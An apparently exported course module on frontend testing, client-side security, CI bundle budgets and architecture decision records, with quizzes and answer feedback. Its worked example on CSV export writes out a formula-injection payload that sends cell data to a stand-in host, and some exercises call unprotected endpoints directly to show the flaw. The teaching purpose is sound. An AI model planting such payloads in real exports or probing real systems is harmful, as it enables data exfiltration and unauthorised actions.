learningExperiences.title: Test the contract, not the construction

contentBlocks.content:
## One rule

**A test should fail when behaviour changes and pass when only implementation changes.** Everything in this experience follows from that rule.

```tsx
expect(container.querySelector('.refund-btn')).toBeDisabled();                  // ✗
expect(screen.getByRole('button', { name: /issue refund/i })).toBeDisabled();   // ✓
```

The second version **also works as an accessibility check**: if the query cannot find the button by its role and accessible name, a screen-reader user cannot find it either. That is the real cost of `getByTestId` as a habitual first choice — it discards this check for no benefit.

interactionSequence.prompt: A test suite has 2,300 tests targeting CSS class names and internal component state. A developer renames a class purely for readability, changing no visible behaviour. What happens?
options: Nothing fails, since the rename does not change any user-visible behaviour
Every test asserting on that class name fails, despite the rename being behaviourally invisible to any user
Only tests specifically testing that component fail; everything else is unaffected
The tests are automatically updated by the test runner to reflect the new class name

optionFeedback.feedback: This is what *should* happen under the contract rule, and is exactly what does not happen with class-name assertions — they are coupled to the very thing that just changed.

Correct, and this is precisely what produces a suite that breaks on every refactor: the assertion is coupled to construction, so a purely cosmetic rename is indistinguishable, from the test's point of view, from an actual behavioural regression.

Any test anywhere in the suite that happens to also reference that class name fails, regardless of which component it was nominally testing — coupling can spread further than a single component's own test file.

No test runner automatically rewrites assertions to match renamed implementation details; this would require the test to somehow know the rename was intentional and harmless, which is exactly the judgement a class-name assertion cannot make.

feedback.elaborativeFeedback: This is the mechanism behind the section's opening story directly: hundreds of tests broke on renames and refactors that changed nothing a user could perceive, and the team's rational response to that pain was to stop refactoring — a suite bought to make change safer ended up making change more expensive instead.
hints: Does a class-name assertion know the difference between a cosmetic rename and a real behavioural change?

interactionSequence.prompt: A test passes in CI, and the feature fails in production, because the real API returns `balancePence` while the test's module mock returned `balance`. What specifically allowed this gap to exist?
options: The test did not have enough assertions
The module mock replaced the real fetch layer entirely, so the test verified the component against an assumption the author wrote, never against the actual API contract
The component itself has a bug unrelated to the mock
The test needs a higher timeout value

optionFeedback.feedback: More assertions checking the same mocked, incorrect data would still pass — the problem is not assertion quantity, it is what layer was actually under test.

Correct. The module mock is not a stand-in for the network response — it is a stand-in for whatever the test's author *believed* the network response would be, and nothing checked that belief against reality.

The component itself may be entirely correct, faithfully rendering whatever field name it is given — the mismatch is between the mock's field name and the real API's, not a defect in the component's own logic.
Timeout duration is unrelated to a field-name mismatch between a mock and a real API response.

feedback.elaborativeFeedback: The diagnostic test to apply going forward: for any mock, ask what would happen if the real API changed shape tomorrow. If the mock would happily continue returning the old shape with no test noticing, the mock is not verifying a contract — it is only verifying internal consistency with itself.
hints: What did the test actually verify — the component's behaviour against the real API, or against the test author's own assumption?

steps: Identify the module mock's assumption: `{ balance: 4000 }`. Check the real endpoint's actual response shape directly — suppose it genuinely returns `{ balancePence: 4000 }`. The mock and reality have already silently diverged.

Run the test as originally written, still asserting `£40.00` via `screen.findByText`. It now fails — not because the rewrite broke anything, but because the component was reading `data.balance`, which no longer exists in the intercepted response; this is the real bug the module mock had been hiding.
Fix the component itself to read `data.balancePence`, confirming the test now genuinely exercises the real contract end to end, not merely the author's prior belief about it.

Confirm the accessibility side benefit directly: temporarily remove the button's accessible name (delete its visible text, leaving only an icon with no label) and observe `getByRole` now fails to find it — precisely the same failure a screen-reader user would experience, caught by a test written for an entirely different original purpose.

Restore the accessible name and confirm the full suite passes again, now genuinely coupled to behaviour rather than construction on every axis: the network contract, the interaction sequence, and the accessible structure.
workedExamples.conclusion: The rewrite did not just make the test prettier — it found a real, previously hidden bug (`balance` versus `balancePence`) that had been masked by a mock trusting its own assumption, and it gained an accessibility check as a side effect of switching to role-based queries. Both improvements came from the same underlying change: testing what the component actually does, against what the API actually returns, rather than testing the component against a story the test's original author had told themselves.

retrievalPractice.prompt: State the contract-versus-construction rule for a well-written test, in one sentence.
What does a role-based query gain for free, beyond refactor resilience?
For any mock in a test suite, what question would reveal whether it is verifying a real contract or only internal consistency with itself?

learningExperiences.title: The client is not a security boundary

contentBlocks.content:
## Hidden UI is not a permission

```tsx
{canRefund && <RefundButton />}
```

This improves the interface. It enforces **nothing** — the request can be issued directly with `curl` regardless of whether the button exists. This is Section 7's route-guard argument, generalised: **any** client-side check exists to avoid showing a user an action that would predictably fail, never to prevent the action itself.

**The server must authorize every request independently.** And the client must handle a 403 as a **normal, expected outcome** — permissions change while a browser tab stays open for hours, so a UI that treats "forbidden" as impossible will crash or misbehave the first time a permission genuinely changes mid-session.

contentBlocks.caption: Quiet exposure paths in a frontend application
rows: Bundled into every visitor's download — a public API key, not a private one
Recorded in browser history, server logs, and referrer headers
Returning full records when only a few fields are displayed, exposing the rest to anyone reading network traffic
Error reporters often capture request bodies and local state by default, including tokens
Reconstructs original source, including comments and internal structure, for anyone who requests them
A cell beginning with `=`, `+`, `-`, or `@` executes as a formula when opened in spreadsheet software

contentBlocks.title: CORS is not authorization
contentBlocks.content: CORS controls which **origins** a browser will let read a response. It does not identify **who** is asking, it is enforced only by browsers, and any tool that is not a browser — a script, a command line, a server-to-server call — ignores it entirely. A correctly configured CORS policy has never once prevented an unauthorised request from succeeding.

interactionSequence.prompt: A fare console hides its "issue refund" button for agents without the correct permission. The refund endpoint itself has no server-side permission check. What happens if an unauthorised agent calls the endpoint directly with a tool like `curl`?
options: The request fails, since the frontend never sent the request the button would have triggered
The request succeeds exactly as if it came from an authorised agent, because nothing on the server checked who was asking
The browser blocks the request due to CORS
The request succeeds but returns no data, providing an implicit safety net

optionFeedback.feedback: The endpoint has no dependency on the frontend having sent the request through any particular UI path — it accepts any correctly formed request, from any source, since nothing checks the caller's authorisation.
Correct. Hiding the button changed nothing about what the endpoint accepts. This is the exact scenario from this section's opening story, at a real municipal transport operator.
CORS is a browser-enforced policy about which origins may *read a response*; a tool like `curl` is not a browser and is entirely unaffected by it, regardless of any CORS configuration.
With no server-side check at all, the endpoint has no reason to withhold data or refuse to act — it processes the request exactly as designed, for anyone.

feedback.elaborativeFeedback: The most persuasive way to end a disagreement about this is not to argue the principle abstractly but to actually run the `curl` command and show the result — a documented successful unauthorised call is harder to dismiss than a hypothetical one, which is exactly the demonstrate-don't-argue instinct Section 5 and Section 7 both taught.
hints: Does the server-side endpoint have any way of knowing whether a request came from the visible button being clicked, versus from any other source?

interactionSequence.prompt: A team fixes the refund endpoint by adding a proper server-side region check. Two weeks later, an agent reports the refund screen "just breaks" occasionally with no error message, and it correlates with agents whose regional assignment changed mid-shift. Diagnose, connecting your answer to this experience's material on handling 403 responses.

feedback.elaborativeFeedback: The server-side fix is correct and necessary, and it introduced a new, entirely predictable case the client was never built to handle: an agent whose regional assignment changes mid-shift will now correctly receive a 403 from the server the next time they attempt a refund outside their new scope, even though the client-side `canRefund` check — computed once, likely at login or page load — still believes the action is permitted and still renders the button as enabled. If the client has no explicit handling for a 403 response, it likely surfaces as an unhandled promise rejection or a generic, uninformative failure — 'just breaks,' exactly as reported — rather than a clear message explaining that permissions changed and the page should refresh. The fix is to treat 403 as a normal, anticipated outcome: catch it specifically and show a message such as 'Your access has changed; please refresh,' rather than allowing it to fall through as an unhandled error.

confidencePrompt.prompt: How confident are you in this diagnosis?

interactionSequence.prompt: In your own words: a colleague argues that a CSV export is "just a formatting feature" and does not need a security review. Explain what they are missing, using this section's material.

feedback.elaborativeFeedback: A strong answer identifies that a cell value beginning with `=`, `+`, `-`, or `@` is interpreted as a formula by common spreadsheet software the moment the file is opened — meaning any field that accepts free-text user input and later appears unescaped in a CSV export is a genuine injection point, capable of running arbitrary formulas (including ones that exfiltrate other cells' data or reach out to external URLs) on whatever machine opens the file. The 'just formatting' framing misses that the export is not a passive rendering of data; it is an artifact that gets executed by other software, and any field a user can influence is therefore worth the same scrutiny as any other user-controlled input reaching a code-execution context, exactly as HTML rendered with `dangerouslySetInnerHTML` would be.

steps: Set an agent note to a value beginning with an equals sign, simulating what a malicious or merely careless input could contain: `=HYPERLINK("https://example.com/steal?data="&A1,"Click")`.

Generate the export and open it in common spreadsheet software. Confirm the formula executes rather than displaying as literal text — the cell shows a clickable hyperlink rather than the raw string that was actually stored, and clicking it could exfiltrate the contents of another cell to an external server.

Identify the general rule: any cell value beginning with `=`, `+`, `-`, or `@` is treated as a formula by default. The specific formula's danger varies, but the parsing behaviour itself is the vulnerability, regardless of what any individual malicious value happens to do.

Regenerate the export with the same malicious note and confirm it now displays as inert literal text — the leading apostrophe forces text interpretation in common spreadsheet software, and no formula executes.
Add a regression test asserting specifically that a note beginning with `=` is escaped in the generated output, not merely that the export function runs without throwing.
workedExamples.conclusion: The fix is a few lines, and the review habit is the actual point: any export destined for software that interprets its content — not merely displays it — deserves the same scrutiny as HTML rendered unsanitised or a query built from unescaped input. "It's just an export" is a framing that hides exactly what makes this dangerous: the file is not read, it is executed.

retrievalPractice.prompt: What does a client-side permission check accomplish, and what must be true on the server regardless of what the check finds?
Contrast CORS with server-side authorization. Which one identifies who is asking?
Name the six quiet exposure paths from this experience's table, and pick the one you consider easiest to overlook in an ordinary code review — say why.

learningExperiences.title: Gates that block, and budgets set from a real device

contentBlocks.content:
## Advisory checks get ignored, eventually

A quality bar not enforced by a machine is a preference. Reviewers are inconsistent, tired, and outnumbered by pull requests — a check that only *reports* rather than *blocks* depends on someone noticing the report and choosing to act on it, every single time, under whatever deadline pressure exists that week.

**Bundle size regressions are the clearest case.** One incorrectly configured import, or a chart library accidentally pulled into the entry chunk, adds hundreds of kilobytes that nobody sees in a code review diff — the increase is invisible in the change itself, only visible in a measurement nobody is forced to take.

contentBlocks.title: Set the budget from the target device, not the current bundle
contentBlocks.content: A budget derived from "whatever the bundle currently weighs, plus a little headroom" ratchets upward indefinitely alongside the very drift it is meant to prevent. Set it instead from a genuine target: the slowest device and network condition a real user is likely to have. When a legitimate need exceeds the budget, **raise it deliberately, in a reviewed commit** — a visible decision, not a silent one — rather than quietly disabling or loosening the check.

interactionSequence.prompt: An entry bundle grew from 210 kB to 1.4 MB over two years, unnoticed. Which response addresses both the current state and the reason it happened at all?
options: Print the bundle size in the CI log for reviewers to monitor going forward
Add a blocking budget set from a real target device, analyse and reduce the current bundle to fit under it, and require any future increase to be a deliberate, reviewed commit
Ask reviewers to specifically watch for large imports during code review from now on
Analyse and reduce the bundle now, planning to add a budget check at some point later

optionFeedback.feedback: A number in a log that nobody is required to act on is exactly the condition that allowed the growth from 210 kB to 1.4 MB to go unnoticed for two years in the first place.
Correct. This both fixes the current regression and installs the specific mechanism that prevents the same drift recurring, with any future legitimate exception made visible rather than silent.
This depends on human vigilance across every future pull request — precisely the mechanism that already failed for two straight years.
Fixing the symptom without the mechanism means the fix's benefit erodes immediately, since nothing prevents the same gradual, invisible drift from beginning again the very next week.

feedback.elaborativeFeedback: Note the shape of this answer: it is the same pattern as Section 5's safe-change discipline and Section 7's case study — fix the immediate problem, and separately install something that changes what the system is capable of producing going forward, rather than stopping at the immediate fix alone.
hints: Which option changes what future pull requests can silently do, rather than only addressing what already happened?

interactionSequence.prompt: A team builds separate artifacts for staging and production from what they believe is identical source code and configuration. A defect appears only in production, never in staging, despite extensive staging testing. Name the most likely structural explanation, and the fix.

feedback.elaborativeFeedback: Building separately for each environment means the artifact actually verified in staging is not, strictly, the same artifact deployed to production — even from identical source, differences in build-time environment variables, dependency resolution at build time, or subtly different build tooling versions between the two build runs can produce genuinely different output. The staging build received all the testing; the production build, technically a different artifact, received none of it directly. This is the failure mode named `mis-rebuild-per-env` in this course's foundation: the fix is to build once and promote that single artifact through environments, loading any environment-specific configuration at runtime rather than baking it in at build time — so the thing verified in staging is, byte-for-byte, the thing that runs in production, verifiable by comparing build hashes across environments.

confidencePrompt.prompt: How confident are you in this diagnosis?

workedExamples.problem: A pull request adds a data-visualisation library to render one small chart, pulling it into the entry bundle by mistake through an incorrect import path. Demonstrate a blocking budget catching this before merge, and demonstrate the correct response to a legitimate, larger increase.
steps:
Configure a blocking budget on the entry chunk, derived from a stated target — for example, a mid-range device on a throttled connection where anything past roughly 200 kB of entry-chunk JavaScript measurably delays interactivity:

```jsonc
[{ "path": "dist/entry-*.js", "limit": "200 kB" }]
```
Open the pull request adding the charting library via `import { LineChart } from 'charting-lib'` rather than a more specific, tree-shakeable import path. Run the budget check locally or in CI.
Confirm the build fails, with the specific size overage reported — this is the blocking behaviour doing its job, catching a mistake before it reaches production rather than after.

Fix the import to a properly scoped path that avoids pulling the library's full bundle into the entry chunk, or move the chart into a separately loaded route chunk if it is only used on one page. Re-run the check; confirm it now passes.

Separately, construct the legitimate-increase case: a genuine, deliberate product decision to add a substantial new capability that will unavoidably increase the entry bundle beyond the current budget.

Handle this correctly: raise the budget's number in the same pull request that adds the capability, as a visible, reviewed line-item change that a reviewer can see and specifically approve — not a silent removal of the check, and not a separate, unrelated commit that obscures why the number changed.

Contrast the two outcomes: the accidental-import case is caught and reduced without ever reaching the budget file at all; the legitimate case reaches the budget file, but only as an explicit, attributable decision, not a quiet drift.
workedExamples.conclusion: The budget did not prevent the second, legitimate increase from happening — it was never meant to. What it did was force the increase to be a decision someone can point to, rather than a change nobody remembers approving. That distinction, between blocking-and-forcing-visibility and blocking-and-preventing, is the actual purpose of most gates in this section: they do not exist to make certain choices impossible, they exist to make sure every choice was actually made rather than merely happening.

retrievalPractice.prompt: Why do advisory checks eventually get ignored, and what makes a blocking gate different?
Where should a bundle budget's number come from, and what should happen when a legitimate need exceeds it?

learningExperiences.title: Evaluating a dependency, and writing the decision down

contentBlocks.content:
## Four criteria

**Maintenance** — recent releases, more than one maintainer with the ability to publish. **Size** — actual cost added to the bundle. **Exit cost** — a date formatter is replaceable in a day; a state or form library embeds itself into every component that touches it and is a rewrite to remove. **Overlap** — does something already installed do this? Three separate date libraries in one dependency tree is a real, commonly observed outcome, not a hypothetical one.

Weight the diligence by exit cost specifically: a trivial-to-replace utility deserves a quick look; anything that will be woven through the whole application deserves real scrutiny before it is adopted, because that scrutiny becomes far more expensive after the fact.

## Write the decision down

A one-page **Architecture Decision Record**: context, options considered, decision, consequences — including what becomes harder, not only what improves. Store it beside the code it concerns.

The reason is not process for its own sake. Six months on, nobody remembers why server state lives in the query cache while wizard state lives in a scoped store, or why tokens sit in cookies rather than local storage — Section 1's dependency-direction lint rule is the same idea in a different form: a rule enforced mechanically, or documented explicitly, survives the departure of the person who understood it. Without the record, a well-meaning new contributor reads an unexplained pattern as inconsistency and "cleans it up," silently reintroducing whatever problem the original decision solved.

interactionSequence.prompt: A team agrees that features must not import each other's internal files — the same rule Section 1 taught, enforced originally only by team agreement. Six months later it has happened in four places anyway. What is the most likely explanation, and what is the fix, drawing directly on Section 1?
options: The rule was not written down clearly enough in the team's documentation
An unenforced agreement depends on every reviewer catching every violation, every time, under deadline pressure — a lint rule enforces the same boundary mechanically and fails the build instead
The codebase's folder structure needs to be reorganised entirely
The team needs to hire more senior reviewers

optionFeedback.feedback: Clearer documentation helps a reviewer who happens to consult it at exactly the right moment; it does not catch the deep import written under deadline pressure at the end of a long day by someone who never thought to check.

Correct — and this is Section 1's own conclusion, restated here as a general principle: mechanical enforcement does not depend on anyone remembering anything, which is exactly what an unenforced agreement does depend on.
The structure itself may be entirely fine; what is missing is a mechanism enforcing the rule about crossing it, not a different arrangement of the same folders.

Even highly experienced reviewers miss violations buried in large diffs under time pressure; this places the entire burden on individual vigilance rather than on a tool that never gets tired or rushed.

feedback.elaborativeFeedback: This is deliberately the same lesson Section 1 taught, revisited here to confirm it generalised: a structural rule that depends on a person remembering it, correctly, every single time, will eventually be missed — not because anyone was careless, but because that is what unenforced rules reliably do over a long enough timeline.
hints: Does the fix depend on someone remembering something, or does it operate mechanically regardless of memory?

interactionSequence.prompt: A team is choosing between two date-formatting libraries and a full-featured state management library for a new feature area. Explain why these two decisions deserve very different amounts of diligence, using this experience's exit-cost criterion specifically.

feedback.elaborativeFeedback: A date-formatting library is typically called from a small, identifiable set of call sites, each doing essentially the same kind of work — formatting a value for display. Replacing it later, should it turn out to be a poor fit, means updating those call sites, which is a bounded, mechanical, roughly one-day task regardless of how the initial choice turns out. A state management library, by contrast, becomes woven into the structure of every component that touches the state it manages — its patterns shape how data flows through the application, how components are composed, and how tests are written. Reversing that choice later is not a localized update; it is closer to a rewrite of every feature area that adopted it. Because the cost of being wrong is so different between the two, the diligence spent evaluating them before adoption should be correspondingly different: a quick comparison for the date library, and a genuinely careful evaluation — including a serious look at exit cost itself — for the state library.

confidencePrompt.prompt: How confident are you in this reasoning?

workedExamples.problem: Write a short Architecture Decision Record for the token-storage decision from Section 10's own client-security material: `httpOnly; Secure; SameSite=Lax` cookies rather than local storage.
steps: Write the **context**: describe the problem that forced a decision, not merely the general topic. "The application needs to store an authentication token client-side after login, and the storage mechanism affects exposure to both cross-site scripting and cross-site request forgery."

List at least two genuine **options considered**, with the trade-off of each stated honestly rather than presenting the eventual choice as the only reasonable one. Option A: local storage, readable by any script running on the page, meaning a successful XSS attack directly and completely compromises the token, but with no inherent CSRF exposure. Option B: an `httpOnly` cookie, unreadable by JavaScript entirely, which closes off the XSS-to-token-theft path, but which introduces CSRF exposure that must be separately mitigated, typically with an anti-CSRF token pattern.

State the **decision** specifically enough that it would actually settle a future disagreement: "Use an `httpOnly`, `Secure`, `SameSite=Lax` cookie for the authentication token, paired with an anti-CSRF token validated on all state-changing requests."

State the **consequences**, including honestly what becomes harder, not only what improves: "XSS can no longer directly steal the token, which was judged the higher-likelihood risk for this application given its use of user-generated content. CSRF mitigation must now be implemented and maintained correctly on every state-changing endpoint, which local storage would not have required. Client-side code can no longer read the token directly for any purpose, including debugging in the browser console, which some developers may initially find inconvenient."

Store the record in the repository, in a location a future contributor investigating "why is the token in a cookie and not local storage" would actually find — beside the authentication code itself, not in a separate wiki that will drift out of sync or be forgotten.

Test the record's real value directly: six months later, imagine a new team member proposes moving the token to local storage "for simplicity," having read the code but not the record. The ADR, if found, settles the question immediately by supplying the reasoning that led to the current design — without it, the same debate has to be re-litigated from scratch, and there is a real risk the change gets made, quietly reopening a vulnerability the team had already deliberately closed.
workedExamples.conclusion: The record's value is not in having written something down for its own sake — it is specifically in being *findable* and *specific enough to settle a real future disagreement*, which is a higher bar than simply documenting that a decision occurred. A record that only says "we chose cookies for security reasons" would not have stopped the local-storage proposal in the final step; a record stating the specific trade-off actually considered, and why it was resolved the way it was, does.

retrievalPractice.prompt: Give the four dependency-evaluation criteria and the four parts of an Architecture Decision Record.
What specifically goes wrong, six months after a structural decision, if it was never written down? Be specific about the failure mode, not just "nobody remembers."

learningExperiences.title: Case study: the audit that found four separate things

contentBlocks.content:
## Return to the opening story, in full

The section opened with two findings from the fare console: the fragile test suite, and the unauthorised refund. Read the complete account now — a single security audit found both, plus two more, in one pass.

interactionSequence.prompt: Before reading the full account: a security audit triggered by the unauthorised-refund finding goes on to also find a client-side-only route guard on an admin screen, a token stored in local storage, and an entry bundle far larger than anyone expected. What single theme connects all four findings, including the original fragile-test-suite issue?

feedback.elaborativeFeedback: Every one of these is a case of trusting a mechanism that was never actually enforced: tests that appeared to verify behaviour but actually verified construction; a hidden button trusted as if it were a permission; a route guard trusted as if it were authentication; local storage trusted as if it were a secure place to keep a token, when it is readable by any script on the page; and a bundle size trusted to stay reasonable with nobody actually measuring it against anything. The common thread is the gap between what a mechanism *looks like* it guarantees and what it actually, mechanically enforces — and this section's material throughout is about closing exactly that gap, in each of these specific areas.

confidencePrompt.prompt: How confident are you in this synthesis?

interactionSequence.prompt: The team must decide how to sequence fixing all four findings. **A:** fix all four with equal priority in parallel. **B:** fix the refund authorization and the token storage first, then the route guard, then treat the test suite and bundle size as longer-term structural work. Evaluate B's sequencing logic.

feedback.elaborativeFeedback: B's sequencing is defensible on a straightforward severity basis: the refund authorization gap and the exposed token are both immediately, actively exploitable security holes with real financial and privacy consequences right now, whereas a fragile test suite and an oversized bundle are real costs, but costs that accrue gradually rather than representing an active, exploitable vulnerability sitting open at this moment. The route guard finding sits between the two — not itself directly exploitable if the underlying admin endpoints are otherwise properly secured, but worth confirming that quickly rather than assuming it. A strong answer notes that this is not merely 'security first, quality second' as a blanket rule, but rather triage based on which findings represent an active, immediately exploitable risk versus which represent an accumulating structural cost — the same distinction this course has drawn before between an urgent symptom-level fix and a valuable but less time-critical systemic one.

confidencePrompt.prompt: How confident are you in this evaluation?

workedExamples.problem: **Case study — the audit that found four separate things.** Reconstruct the full audit at the municipal transport operator, from the initial trigger through all four findings and their remediation.
steps: **The trigger.** A routine security review, prompted by an unrelated compliance requirement, began by attempting to reproduce a reported "refund button visible to the wrong agents" ticket — expected to be a minor UI bug.

**Finding one.** The button was, in fact, correctly hidden for out-of-region agents; the reviewer, out of habit, tried calling the refund endpoint directly regardless. It succeeded, for any agent, region entirely unchecked server-side — the unauthorised-refund finding from this section's opening.

**Widening the scope, deliberately.** Given the severity of finding one, the reviewer chose to audit every other client-side-only permission check in the console rather than stopping at the one confirmed issue.

**Finding two.** An admin-only "void transaction" screen was protected by a route guard checking a client-side role flag, with — again — no corresponding server-side check on the void endpoint itself. A second instance of the exact same underlying mistake as finding one, in a different feature area entirely.

**Finding three, from a different angle.** Reviewing how the session token was stored, the reviewer found it in `localStorage`, directly readable by any script running on the page — meaning any successful cross-site scripting vulnerability anywhere in the application, however minor, would grant complete access to any logged-in agent's session.

**Finding four, almost incidental.** While instrumenting the app to trace network calls for the audit, the reviewer noticed the entry bundle took several seconds to load even on a fast connection, and pulled up a bundle analyzer out of curiosity — revealing an unrelated internal tool's dependency had been accidentally included in the main application bundle for over a year.

**The engineering team's separate, earlier finding.** Independently, an engineer attempting a refactor of the refund panel had already discovered the fragile, construction-coupled test suite described at the start of this section — the two investigations, security and engineering-quality, had been running in parallel without either team initially realising the connection between them.

**Remediation, sequenced by severity.** The refund and void-transaction endpoints received server-side authorization checks immediately, as active vulnerabilities. The token moved to an `httpOnly` cookie with CSRF protection, documented in an ADR per this experience's worked example. The bundle issue was fixed and a blocking budget added. The test suite rewrite, already underway from the engineering side, continued as planned, now explicitly connected to the same broader "stop trusting mechanisms that were never actually enforced" theme running through all four findings.
workedExamples.conclusion: Four significant findings, from what began as an investigation into one minor-seeming ticket, because the reviewer widened scope after the very first confirmed finding rather than stopping there — precisely the widening habit Section 8's internationalization case study demonstrated in a completely different domain. The connecting thread across all four, worth carrying forward past this specific incident: **whenever one instance of "a mechanism looked like it enforced something but didn't" is found, treat it as evidence the same category of mistake may have been made elsewhere in the same codebase, and look before assuming this was an isolated case.**

retrievalPractice.prompt: Why did widening the audit's scope after the first finding matter here, and which earlier section's case study used the identical widening strategy in a completely different domain?

learningExperiences.title: Key terms, common errors, and summary

terms.definition: Observable behaviour versus how code is currently built. A test should fail when the first changes and pass when only the second does.
The Testing Library ranking from getByRole through getByLabelText and getByText to getByTestId, ordered by resemblance to how a real user finds an element.
Intercepting HTTP so the application's real fetch layer, cache keys, serialisation, and error mapping remain genuinely under test, unlike mocking an internal module.
A normal, expected outcome that a client must handle explicitly, since permissions can change during a session that outlives them.
A browser-enforced policy governing which origins may read a response. Identifies nothing about who is asking and is ignored entirely by non-browser clients.
A cell beginning with =, +, -, or @ being executed as a formula by spreadsheet software, making an export a code-execution surface rather than a passive rendering of data.
A CI check that prevents merging rather than reporting, since an unenforced standard degrades under delivery pressure.
An enforced size ceiling that fails the build when exceeded, set from a real target device rather than from the bundle's current size.
How expensive a dependency is to remove or replace later; a criterion for how much diligence its initial adoption deserves.
A one-page record of context, options considered, decision, and consequences, stored beside the code it concerns.

contentBlocks.title: Common errors
contentBlocks.content:
1. **Asserting on CSS classes, test IDs by default, or internal state.**
2. **Mocking your own API module**, testing against your own assumption rather than the real contract.
3. **Rendering a component to test a reducer or selector**, when a plain unit test would do and would run faster.
4. **Believing conditional rendering enforces a permission.**
5. **Not handling a forbidden response as a normal outcome.**
6. **Assuming CORS provides authorization.**
7. **Secrets in environment variables that reach the client bundle.**
8. **Enabling error-reporting telemetry before configuring what it scrubs.**
9. **Exporting CSV without escaping a leading `=`, `+`, `-`, or `@`.**
10. **CI checks that only report**, never blocking a merge.
11. **Rebuilding separately per environment** rather than promoting one verified artifact.
12. **Adding a dependency without weighing exit cost against how deeply it will embed itself.**
13. **Making a structural decision with no written record**, leaving it to be silently undone later by someone who never knew the reasoning.

## Summary

- **Fail on behaviour change. Pass on implementation change.** Query by role and label; this doubles as an accessibility check.
- **Mock at the network boundary.** A module mock verifies your own assumption, not the real contract.
- **The client is not a security boundary.** Hidden UI is UX; the server authorizes every request, independently, and a 403 is a normal outcome to handle.
- **Watch the quiet paths**: bundle secrets, sensitive URLs, over-fetching, default telemetry, public source maps, and CSV formula injection.
- **Gates must block.** Budgets come from a real target device, and any increase is a deliberate, reviewed decision.
- **Evaluate dependencies on maintenance, size, exit cost, and overlap** — and **write the decision down**, specifically enough to settle a future disagreement, not merely to record that one occurred.

feedback.elaborativeFeedback: Several defensible answers exist. One strong candidate is Section 2's discriminated-union material: an interface with optional fields *looks* like it constrains what states are representable, but does not actually enforce anything, since impossible combinations remain fully writable — the type appeared to guarantee something it never mechanically checked, the exact shape of this section's theme, applied to the type system rather than to tests, permissions, or delivery.

learningExperiences.title: Practical activity: prove the gap, then close it

contentBlocks.content:
## Document the gap before you close it

Step 3 specifically asks you to document a successful unauthorised request **before** writing any fix — this is deliberate, matching this section's own case study, where the demonstration itself was what actually made the finding undeniable.

selfGuidedExercise.realWorldContext: You are auditing a small application against this section's four areas — reproducing the class-name-fragile test, the unenforced permission, the ungoverned bundle, and an unrecorded structural decision — before fixing each with the specific method this section taught.
selfGuidedExercise.objective: Rewrite a fragile test to assert on contract, demonstrate and fix an unauthorised request against a hidden-but-unprotected action, add a blocking bundle budget, and write one genuine ADR.
materialsOrPrerequisites: A small React project with a form or action-triggering component, a way to mock or intercept network calls (MSW recommended), and a build tool supporting a bundle size check
A terminal or API client capable of issuing requests directly, bypassing the UI (curl or an equivalent)
instructions: **1. Reproduce a fragile test.** Write a test asserting on a CSS class name or internal state for some interactive element. Rename the class or refactor the internal state representation without changing any visible behaviour. Confirm the test fails despite nothing observable changing.

**2. Rewrite it.** Convert the same test to role-based queries with `userEvent`. Confirm it now survives the same rename. Then remove the element's accessible name and confirm the rewritten test now correctly fails for a real reason.

**3. Reproduce and document an unauthorised request.** Build (or use an existing) action gated only by conditional rendering, with no server-side check. Call the underlying endpoint directly, bypassing the UI entirely, and document the successful, unauthorised response.

**4. Fix it.** Add a server-side check. Confirm the same direct call now correctly fails. Add explicit client-side handling for the forbidden response, and verify it produces a clear message rather than an unhandled failure.

**5. Add a blocking bundle budget.** Set a limit based on a stated target device and connection. Deliberately import something that exceeds it and confirm the build fails. Then justify and record a legitimate, deliberate increase.

**6. Write one ADR.** Choose any real structural decision from your own project (or from a decision made earlier in this course's practical activities). Write context, options considered, decision, and consequences — specific enough that a colleague reading only the record, with no other context, could correctly explain why the alternative was not chosen.
reflectionPrompts: In step 1, did the failure feel like a real defect being caught, or did it immediately feel like noise? What does that reaction tell you about how this kind of test failure is usually received on a real team?

In step 3, what was your emotional reaction to seeing the unauthorised request actually succeed? Does that reaction help explain why a documented demonstration is more persuasive than describing the risk abstractly?
In step 5, how did you decide on the specific target device and connection for your budget? Was the number defensible, or somewhat arbitrary?
In step 6, try to poke a hole in your own ADR: is there a reasonable follow-up question a colleague could ask that your record does not answer? If so, what would you add?

selfAssessmentCriteria: Step 1 demonstrates an actual test failure caused by a behaviourally invisible change, not a hypothetical description
Step 2 demonstrates the rewritten test surviving the same rename and correctly failing when the accessible name is removed
Step 3 includes a documented, actual successful unauthorised response, obtained by calling the endpoint directly
Step 4 demonstrates the same direct call now failing, plus a specific, visible client-side message for the forbidden case
Step 5 demonstrates an actual failed build from exceeding the budget, and a stated, specific target device and connection the number was derived from
Step 6 is specific enough that a described colleague-with-no-context test would plausibly be settled by reading it alone

retrievalPractice.prompt: You have twenty minutes to review a pull request adding a new permission-gated action. What do you check, in what order?

learningExperiences.title: Section quiz

contentBlocks.content:
## Check your understanding

Answer without scrolling back.

Three true/false questions, then three short-answer questions.

interactionSequence.prompt: **True or false.** A test suite that queries by `data-testid` throughout has the same quality as one querying by accessible role, given the same assertions.
options: True
False

optionFeedback.feedback: Incorrect. Role-based queries also verify the element is reachable by assistive technology; test IDs discard that check for no benefit.
Correct.

feedback.elaborativeFeedback: The two forms find the same behavioural regressions, but only one of them also catches an accessible-name regression as a side effect.

interactionSequence.prompt: **True or false.** Because a refund button is hidden for unauthorised users, the refund endpoint does not need its own authorization check.
options: True
False

optionFeedback.feedback: Incorrect. The endpoint remains directly callable by anything capable of issuing a request; hidden UI only prevents a predictable UI-driven failure, not the underlying action.
Correct.

feedback.elaborativeFeedback: This is this section's opening finding — verified, not hypothetical, at a real operator.

interactionSequence.prompt: **True or false.** A correctly configured CORS policy prevents unauthorised callers from using an API.
options: True
False

optionFeedback.feedback: Incorrect. CORS governs which origins a browser will let read a response; it does not identify the caller and is ignored entirely by anything that is not a browser.
Correct.

feedback.elaborativeFeedback: A tool like `curl` demonstrates this directly — it is not a browser, so CORS has no bearing on it at all.

interactionSequence.prompt: **Short answer.** A test passes in CI but the feature fails in production, because the API returns `amountPence` while the test's mock returns `amount`. Explain precisely how the mocking approach allowed this to happen, and describe the fix.

